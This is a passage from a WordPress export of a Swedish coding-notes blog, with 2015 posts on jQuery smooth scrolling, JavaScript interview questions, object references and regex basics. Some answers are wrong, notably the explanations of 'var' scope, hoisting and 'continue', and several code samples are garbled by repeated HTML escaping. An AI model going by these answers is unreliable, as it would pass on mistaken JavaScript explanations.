			<wp:meta_value><![CDATA[15905106709]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[523]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[523]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_976e26ff690d37879bec14c080708da1</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_32833d37f195abacb1214e5f308132d6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Bra css/jQuery/js trix</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/10/19/bra-cssjqueryjs-trix/</link>
		<pubDate>Mon, 19 Oct 2015 03:11:52 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=527</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Smooth-scroll till en sektion</h1>
Gör smooth-scroll till en sektion. 
Lägg till den här koden i din .js-fil. Och ankra sedan länkarna till deras ID. Ex. Koden är copypastad <a href="https://css-tricks.com/snippets/jquery/smooth-scrolling/">här</a>.

[code lang="html"]
&lt;section id=&quot;portfolio-section&quot;&gt;
&lt;/section&gt;
[/code]
[code lang="js"]
$(function() {
  $('a[href*=#]:not([href=#])').click(function() {
    if (location.pathname.replace(/^//,'') == this.pathname.replace(/^//,'') &amp;&amp; location.hostname == this.hostname) {
      var target = $(this.hash);
      target = target.length ? target : $('[name=' + this.hash.slice(1) +']');
      if (target.length) {
        $('html,body').animate({
          scrollTop: target.offset().top
        }, 1000);
        return false;
      }
    }
  });
});
[/code]


<h1>Fade in från vänster eller höger när man skrollar ner</h1>
<a href="http://jackonthe.net/css3animateit/">Här</a> finns filerna och dokumentationen. ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1668</wp:post_id>
		<wp:post_date>2015-10-19 03:11:52</wp:post_date>
		<wp:post_date_gmt>2015-10-19 03:11:52</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>bra-cssjqueryjs-trix</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="javascript"><![CDATA[javascript]]></category>
		<category domain="category" nicename="jquery"><![CDATA[jQuery]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[15966805468]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[527]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[527]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>App-idé: JavaScript-frågor</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/10/25/app-ide-javascript-fragor/</link>
		<pubDate>Sun, 25 Oct 2015 15:23:57 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=530</guid>
		<description></description>
		<content:encoded><![CDATA[Prepare for JS-job

Att göra en app som jag gjorde när jag pluggade inför dippen. Göra ett frågespel med javascript-frågor. Med olika kategorier: typ fundamentals, challenges, olika koncept.

Sen kan användaren göra frågorna och bli bättre. Om en person inte kan frågan så markeras den med en viss poäng. Frågorna med lägsta poängen kommer upp först. Så att man hela tiden tränar på de frågorna som man är sämst på. Vid varje fråga finns en länk till en sida som förklarar konceptet mer utförligt.

Type såna här frågor: https://www.codementor.io/javascript/tutorial/top-ten-things-beginners-must-know-javascript

http://www.skilledup.com/articles/20-must-know-javascript-interview-qa

&nbsp;

<h2>Frågor</h2>
<h3>Closure</h3>
<strong>What is lexical scoping?</strong>
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Closures

<strong>Is an Object mutable or imutable?</strong>
Ett objekt är mutable. Detta innebär att objektets innehåll kan förändras. En primitiv data, så som string eller nummer kan inte ändras. Detta innebär att om du ändrar en variabels innehåll, så ändrar du det egentligen inte. Du lägger bara till det. Men det gamla värdet ligger fortfarande kvar i minnet. Detta gör att det kan vara mer krävnade. Det gamla värdet försvinner först när det är dags för garbage collection.
Ett object däremot, om du ändrar det så ändras värdet i minnet.

<strong>Is a primitive data mutable or imutable?</strong>
http://stackoverflow.com/questions/3200211/what-does-immutable-mean

<strong>When is Javascript used outside of the browser?</strong>
http://www.programmerinterview.com/index.php/javascript/javascript-outside-the-browser/

<strong>What is ECMA-Script?</strong>
ECMAScript is a standard for a scripting language, and the Javascript language is based on the ECMAScript standard.
http://www.programmerinterview.com/index.php/javascript/javascript-what-is-ecmascript/

<strong>Which are the five primitve datas in javascript?</strong>

<strong>Which are the six primitive data-types in Javascript?</strong>
Boolean
Null
Undefined
Number
String
Symbol (new in ECMAScript 6)

<strong>Which data-type is Object data?</strong>
Objects
Arrays and functions are also Objects.

<strong>What is the difference between undefined and null?</strong>
Undefined is a value that has been declared but not given a value.
Any variable that has not been given a specific value by default gets the value of undefined.
Null is a value. The value of nothing.

<strong>What is the difference between “==” and “===”?</strong>
== checks for equality of the value.
=== checks for the equality of the value and type.
"3" and 3 == true
"3" and 3 === false

<strong> Whats the difference between "var a = 1" and "a = 1"?</strong>
<strong>var</strong> defines the variable locally, and it can not be used outside of that context.
With the <strong>var</strong> the variable is defined globally, and can thus be used outside of that scope. This might be bad practice as it can pollute the global scope.

<strong>What does "1"+2+4 evaluate to?</strong>
Since the first element is a string, the other value are also evaluated as strings.

<strong>What does 1+2+"4" evaluate to?</strong>
Evaluates to 34, because the first two numbers are evaluated arithmiacaly.

<strong>What boolean operator do JavaScript support?</strong>
Or: ||
And: &amp;&amp;
Not: !

<strong>What would be the output of the following statements?
var object1 = { same: 'same' };
var object2 = { same: 'same' };
console.log(object1 === object2);</strong>

False.
Because they are two different objects. They are not equal because they point at different objects.

<strong>What would be the output of the following statements?
var object1 = { same: 'same' };
var object2 = object1;
console.log(object1 === object2);
</strong>

True. Because they reference the same object.

<strong>What is this?
var arr = [[[]]];
</strong>

A three dimensional array.

<strong>What do you get if you do -10 / 0?</strong>
-Inifinity
Known as negative infinity.

<strong>What is the difference between an undeclared variable and an undefined variable?</strong>
An undeclared variable is a variable that does not exist. An undeclared variable will result in an runtime error.

<strong>What different type of loop do javascript support?</strong>
For
for...in
while
do/while

<strong>Mention the three ways to to convert a string to a number?</strong>
Number();
parseInt();
parseFloat();

<strong>What does null mean?</strong>
The NULL value is used to represent no value or no object.  It implies no object or null string, no valid boolean value, no number and no array object.

<strong>What is an anonymous function?</strong>
It is a function that has not been given a name, for example:

var test = function(){
console.log("Hello world")}

This, on the other hand is not a anonymous function:
test(){
console.log("Hello world")}


<strong>Is javascript case sensitive?</strong>
Yes.
These are two different variables:
var test = 0;
var TEST = 1;

<strong>Explain what hoisting is?</strong>
Hoisting means that a function that is initialized will always be send to the top of the scope/function, but not with it's value, but just as a declared.
For example:

var test = 10;
function myFunction(){
console.log(test);
var test = 20;
} 
//Consoles undefined

One would think that this function would console 10. But in fact it consoles undefined. Why is that then?
Because even though the variable is initliaized after the console.log-statement, is autamaticallys becomes declared in the beginning of the function. 

http://code.tutsplus.com/tutorials/javascript-hoisting-explained--net-15092
<strong>What is the difference between declared variable and an initialized variable?</strong>
A declared variable is a variable that has been declared with var. it could be:
var a;
But an initialized variable is a variable that has been given a value.

<strong>What is the difference between break, continue and return?</strong>
<strong>break</strong> stops the loop and the continues after the loop.
<strong>continues</strong> stops the loop and then restart from the beginning. 
<strong>return</strong> stops and leaves the function all together.

<strong>Mentiona three different programming paradigms?</strong>

<strong>How do you create a default parameter in a function?</strong>
This is a ECMA6-script. So at the moment it can only be used in firefox. But it works like this:

function test(arg1, optionalArg = 23){
}
So if you don't put in any optional arg the default argument will be 23.

<h3>Built in javascript functions</h3>

<strong>What built in function would you use to find the index of a ascii symbol?</strong>
indexOf()

<strong>What built in function would you use to get the index of a ascii symbol, starting from the end?</strong>
lastIndexOf();

<strong>What function would you use to combine to lines of text?</strong>
text.concat("hej");

<strong>What's the difference between throw err and console.error("msg");</strong>

Skillnaden är att throw err exit current clode block. Stops the execution. Medan console.log bara printar ut meddelandet i konsollen. 

<strong>What does IIFE stand for? And what is it for</strong>
Det står för Immediately-invoked Function Expression. 

Det är en funktion som är anonym och som executas direkt efter att den har skrivits. Den behöver alltså inte kallas för att den ska executa.

Här är en vanlig funktion. Den skulle inte executa eftersom den aldrig har blivit kallad.
[code lang="js"]
function testFunk(){
console.log(&amp;amp;amp;amp;amp;amp;amp;quot;I am called now&amp;amp;amp;amp;amp;amp;amp;quot;)};
[/code]

Men om vi istället wrappar funktionen inom en IIFE, så kommer den automatiskt att kallas när den laddas.
[code lang="js"]
(function testFunk(){
console.log(&amp;amp;amp;amp;amp;amp;amp;quot;I am called now&amp;amp;amp;amp;amp;amp;amp;quot;)}());
[/code]

För att undvika hoisting så kan det vara bra att använda IIFE.

Här är ett exempel på hoisting.
[code lang="js"]
var v = 1;
var getValue = function(x){
	console.log(x);
}
v = 2;

getValue(v);//Printar ut 2
[/code]

Om vi här istället vill att funktionen ska printa ut det utsprungliga värdet så måste vi få funktionen att executa direkt när den skapas. Så här ser det ut:
[code lang="js"]
var v = 1;
var getValue = (function(x){
	return function(){console.log(x)}
	
}(v));
v = 2;

getValue();//Printar ut 1
[/code]

Det är ett design pattern för att undvika variable hoisting.

<strong>What six values are falsey in javascript?</strong>

0 == false
undefined == false
null == false
NaN == false
"" == false &lt;&lt; Alltså en tom string.
false == false

Detta kan vi enkelt testa genom att skriva:
if (!0){console.log(&quot;False&quot;};
Denna kod innebär alltså att om 0 inte är true så printa False.

Eller för att det inte ska vara lika förvirrande kan man skriva: 
[code lang="&quot;js&quot;"]
if(NaN){console.log(&amp;amp;amp;amp;amp;amp;amp;quot;I am true&amp;amp;amp;amp;amp;amp;amp;quot;)}
else {console.log(&amp;amp;amp;amp;amp;amp;amp;quot;I am false&amp;amp;amp;amp;amp;amp;amp;quot;)};
[/code]

Ett annat sätt att skriva samma sak är:
[code lang="&quot;js&quot;"]
!0 &amp;amp;amp;amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp;amp;amp;amp; console.log(&amp;amp;amp;amp;amp;amp;amp;quot;False&amp;amp;amp;amp;amp;amp;amp;quot;);
!NaN &amp;amp;amp;amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp;amp;amp;amp; console.log(&amp;amp;amp;amp;amp;amp;amp;quot;False&amp;amp;amp;amp;amp;amp;amp;quot;);
!undefined &amp;amp;amp;amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp;amp;amp;amp; console.log(&amp;amp;amp;amp;amp;amp;amp;quot;False&amp;amp;amp;amp;amp;amp;amp;quot;);
[/code]

Allting annat är true. 
Objekt, arrays, funktioner. 
Nummer som är inte är noll. 
All strings som inte är tomma.
True är true

För mer om detta läs <a href="http://james.padolsey.com/javascript/truthy-falsey/">här</a> 

<strong>What is the difference between function-expression and function declaration?</strong>

Function expression = var functionName = function(){};
Function declaration = function functionName(){};

<strong>Vad betyder varje siffra i versionen 4.3.0?</strong>
Major.Minor.Patch

^4.3.0 - Version mellan 4 och 5. För att det inte ska bryta med versionen.


<strong>What is a ternary operations and how does it work?</strong>
Ternary operations are shorthand way to write an if/else statement.

[code lang="js"]
if(hello){
console.log(&amp;amp;amp;amp;amp;amp;quot;It is true&amp;amp;amp;amp;amp;amp;quot;)
}
else {
console.log(&amp;amp;amp;amp;amp;amp;quot;it is false&amp;amp;amp;amp;amp;amp;quot;);
}

//This can be written as following:
console.log(hello ? &amp;amp;amp;amp;amp;amp;quot;It is true&amp;amp;amp;amp;amp;amp;quot; : &amp;amp;amp;amp;amp;amp;quot;It is false&amp;amp;amp;amp;amp;amp;quot;);

[/code]

So question-mark means "if", and : means "else";

<strong>Does javascript have blockscope or function scope and what does that mean?</strong>
It has function-scope but not block scope. One would think that it has block-scope since it has that type of syntax, but in fact it only has function-scope.
This means that a variable that is defined within a 

<strong>Which are the ways you can create an Object?</strong>
[code lang="js"]
//Object literal
var myObj = {name: &amp;amp;amp;amp;amp;quot;My Object&amp;amp;amp;amp;amp;quot;};
//Constructor
var myObj2 = new Object();
myObj2.name = &amp;amp;amp;amp;amp;quot;My Object 2&amp;amp;amp;amp;amp;quot;;
[/code]

<strong>What is a potential pitfall with using typeof bar === "object" to determine if bar is an object? How can this pitfall be avoided?</strong>
Problemet är att null också betraktas som ett objekt. Desamma gäller för arrays också.

<strong>What will the code below output to the console and why?

[code lang="js"](function(){
  var a = b = 3;
})();

console.log(&amp;amp;amp;amp;quot;a defined? &amp;amp;amp;amp;quot; + (typeof a !== 'undefined'));
console.log(&amp;amp;amp;amp;quot;b defined? &amp;amp;amp;amp;quot; + (typeof b !== 'undefined'));
[/code]
</strong>

Här tror man lätt att var a = b =3; är likvärdigt med:
var a = b;
var b = 3;
Men det gör det inte. Egentligen står det:
var a = b;
b = 3;
Vilket gör b till en global variabel. 

<strong>What is the significance, and what are the benefits, of including 'use strict' at the beginning of a JavaScript source file?</strong>
use stric introducerades i ECMA5.
1. Det tvingar scripet till striktare parsing och error handling. Dessa errors skulle annars kanske ignoreras, eller eller failed silently. Nu genererar de istället ett error. So in det är good practice.

2. Det gör det därmed enklare att debugga. Eftersom man får upp fler errors. 

3. Ett enkelt exempel är om man gör en variabel global när den redan är global.
minVar = "test";
Dette generar ett fel när man kör i "use strict" men inte annars.

<strong>What is closure?</strong>
Closure är en inre funktion som har tillgång till de yttre funktionernas variables.

<strong>What is Const?</strong>
en constant variables

<strong>What is a lambda function?</strong>
It is a anonymous function that is saved in a variable.
Example:

[code lang="js"]

var lambda = function(saludos)
{
console.log(saludos);
}

lambda(&amp;amp;quot;hola&amp;amp;quot;);

[/code]
<h2>Node</h2>

<strong>What is the difference between console.log/console.error and throw err?</strong>
The main difference is that throw err breaks the event loop and leaves the function. Console.log(err)/console.error(err) doesn't break the function. It used prints our the error and then moves on.

<strong>What is the event handler in node?</strong>

<strong>What's the difference between token-based authentication and cookie-based authentication?</strong>
För att en användare inte ska behöva verifiera sig själv, eller alltså att logga in varje gång en ny sida besökt så använder man cookies eller tokens.
Så när en användare för första gången loggar in på en sida så svarar servern med att skicka en cookie, som innehåller ett sessions-ID. Det kan vara en lång string med nummer och bokstäver. För varje gång som användaren sedan går till en ny sida så skickas cookien tillbaka till servern och den verifieras. På så sätt behöver inte användare skriva in sina uppgifter varje gång hen besöker en ny sida. Det blir både säkrare mer användarvänligt.

Så, det finns alltså två huvudsakliga sätt att verifiera en användare. Det ena är med coookies och den andra med tokens. De har både sina för och nackdelar.

<strong>Cookies</strong>

<strong>Tokens</strong>
https://auth0.com/blog/2014/01/07/angularjs-authentication-with-cookies-vs-token/
<h2>Algoritmer</h2>

<strong>Kan du skriva ett program som tar reda på om ett tal är ett prim-tal eller inte?</strong>

[code lang="js"]
//Check to se if a number is a prime number
function isPrime(num){
	var divisor = 2;
	while (num &amp;amp;amp;gt; divisor){
		if (num % divisor == 0){
			return console.log(false);
		}
		else {
			divisor++;
		}
	}
	return console.log(true);
}
isPrime(15);
[/code]

<strong>Kan du skriva ett program som skriver ut fibonacci-sekvensen med x antal?<strong>
[code lang="js"]
//How to get the nth fibonacci-number
function fibonacci(n){
  var fibo = [0, 1];
  
  if (n &amp;amp;amp;lt;= 2) return 1;

  for (var i = 2; i &amp;amp;amp;lt;=n; i++ ){
   fibo[i] = fibo[i-1]+fibo[i-2];
   //fibo.push[i];
  }

 return console.log(fibo);
} 

fibonacci(12);
[/code]

<h2>Data structures | Strures of data</h2>
<strong>Vad är en data-struktur? Vad används de till och ge exempel på några vanliga datastrukturer i javascript?</strong>
Här är en fantastiskt serie om datastrukturer.
http://code.tutsplus.com/tutorials/data-structures-with-javascript-whats-a-data-structure--cms-23347

Så en datastruktur är helt enkelt en viss slags struktur av data. Data kan struktureras på många olika sätt. Ett exempel som tas upp i tutorialen som jag länkar till ovan använder sig av exemplet med böcker. Vara bok är en data, och tillsammans är de data (i pluralis). Denna data, alltså dessa böcker, kan organiseras och struktureras på olika sätt. Ett sätt är att ställa alla böckerna i bokstavsordning i en bokhylla. Böckerna kan därefter struktureras efter författarens för ellere efternamn eller efter titel. Fördelen med detta sätt är att vi kan ta ut en bok hur som helst, från vilket position som helst i strukturen.

Om vi däremot ställer upp böckerna på en hög (stack). Så kan vi inte bara dra ut den bok vi vill ha, för då faller ju hela högen. Så om vi vill ta fram en av böckerna som är längst ner i stacken så måste vi ta bort alla böcker ovan, en i taget.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1669</wp:post_id>
		<wp:post_date>2015-10-25 15:23:57</wp:post_date>
		<wp:post_date_gmt>2015-10-25 15:23:57</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>app-ide-javascript-fragor</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[16191275527]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[530]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[530]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_85227e4979eea47be50a315dfe67c63d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_1523c24299c882346a697da463895a63</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_8a7e04242b73c24e5f1830f0f951a861</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_7542f01863218a8ecfec3c1677a8585e</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_fc27afd9137a98d2d980ed198e53ae74</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d6c97ea62da0c29bd3759af02fa66f36</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c170f4d8cf24fff86471a0911ba14a0c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_b9db38039f6ee46aad3e2ebee648519e</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_404b237e642c522da1a7b4b3bdcb54b3</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_066b985a1488c9238ac05212d9185af4</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_478fae52963afca1a45bbb689e20b71b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_1cee6e4066205ad462bab7b7a37ffdbd</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c795386866e3f0b14ff967be1e93b600</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_02332198ceed1e09b0d6873f15de3100</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_98638752002f82029b5494d19891558f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4f69f9d3dc49f6ca5d6690dc7737dbe6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>OOP - Javascript</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/10/25/oop-javascript/</link>
		<pubDate>Sun, 25 Oct 2015 22:06:02 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=535</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Fundamentals av OOP-Javascript</h1>

Det finns en skillnad mellan primitiv och object-data.

Såhär fungerar primitiva data.
[code lang="js"]
var test1 = 0;
var test2 = test1;
console.log(test2);//loggar 0
test2 = 10;
console.log(test2);//loggar 10
[/code]
Såhär fungerar object-data
[code lang="js"]
var test1 = {
a: 0};

var test2 = test1;
console.log(test2.a);//loggar 0
test2.a = 10;
console.log(test1, test2);//båda loggar 10
[/code]
Som vi kan se i det här exemplet så hänger alltså "kopian" av objektet ihop med orginalet, så om du ändrar kopian så ändras orginalet.
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1670</wp:post_id>
		<wp:post_date>2015-10-25 22:06:02</wp:post_date>
		<wp:post_date_gmt>2015-10-25 22:06:02</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>oop-javascript</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[16201338354]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[535]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[535]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Regular expressions</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/10/30/regular-expressions/</link>
		<pubDate>Fri, 30 Oct 2015 23:02:58 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=545</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>^ och $</strong>
^ betyder att texten som söks endast får finnas i början av en rad.
$ betyder att texten som söks endast får finnas i slutet av en rad.
^hej$ hittar endast hej om hej står själv på en egen rad.

<strong>[Character classes]</strong>
Om tecken är inom klamrarna så betyder det: vilket som.
[ab] betyder att både a och b söks.
så gr[ea]y kommer att hitta både gray och grey.

Inom en character class så är ett bindestreck - endast ett bindestreck, och ingen metakaraktär.
Inom character class (alltså inom []) är betyder ^ negation. Alltså
[^6] betyder alla karaktärer som inte är 6
Du kan tänka på Character Classes som ett subspråk inom regex. Där finns det egna regler för hur de olika symbplerna ska tänkas.
<strong>Alternatation</strong>
Ibland vill man söka this or that. Det ena eller det andra. det kan man enkelt göra med hjälp av parenteser och | or.
gr(a|e)y
| betyder här OR. så antingen a eller e.
Så detta problem kan alltså antingen lösa med hjälp av alternation () eller Character Classes []. Det finns dock en viktig skillnad. En character class kan endast skilja enskilda tecken åt, men med alternation så kan man skila flera bokstäver som sitter samman åt.
(Bob|Robert) kommer söka efter båda.
Till skillnad från Character Classes så har inte Alternation sitt eget subspråk, utan följer de vanliga reglerna för regex.

<strong>Endast ord som inte finns inom andra ord</strong>
Om jag vill hitta ordet "you", men inte när det är inom "youtube". Då kan man sätta upp word-boundries.
såhär: byoub

<strong>Antal gånger</strong>
{4} - betyder antalet gånger något skall försekomma. exempel:

[code lang="js"]
/[0-9]{4}/gi
//Betyder 0345 eller 5336. Alltså fyra nummer.
[/code]

{3} Exactly 3 occurrences;
{6,} At least 6 occurrences;
{1,5} Mellan en till 5 gånger.

Ett annat sätt är att använda plustecknet.
+ - betyder att karaktären innan ska repitera 1-oändligt antal gånger.
/y+/ fångar yyyyyyy]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1671</wp:post_id>
		<wp:post_date>2015-10-30 23:02:58</wp:post_date>
		<wp:post_date_gmt>2015-10-30 23:02:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>regular-expressions</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[16378228696]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[545]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[545]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>How to - MEAN-app</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/11/06/how-to-mean-app/</link>
		<pubDate>Fri, 06 Nov 2015 20:59:49 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
